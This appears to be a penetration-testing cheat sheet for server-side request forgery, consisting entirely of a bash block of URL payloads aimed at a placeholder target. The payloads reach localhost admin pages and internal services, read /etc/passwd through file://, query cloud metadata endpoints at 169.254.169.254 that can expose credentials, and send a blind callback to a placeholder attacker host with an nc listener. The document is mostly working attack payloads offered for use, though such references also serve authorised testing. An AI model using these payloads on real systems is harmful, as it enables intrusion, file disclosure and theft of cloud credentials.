# Server-Side Request Forgery (SSRF)

```bash
# Basic test
http://$TARGET_IP/page?url=http://127.0.0.1/admin
http://$TARGET_IP/page?url=http://localhost:8080

# Access internal services
http://$TARGET_IP/page?url=file:///etc/passwd
http://$TARGET_IP/page?url=dict://localhost:3306

# SSRF to Cloud Metadata (AWS/GCP/Azure)
http://$TARGET_IP/page?url=http://169.254.169.254/latest/meta-data/
http://$TARGET_IP/page?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01

# Blind SSRF (DNS callback)
http://$TARGET_IP/page?url=http://$ATTACK_IP/
# Listen with: nc -lvnp 80
```
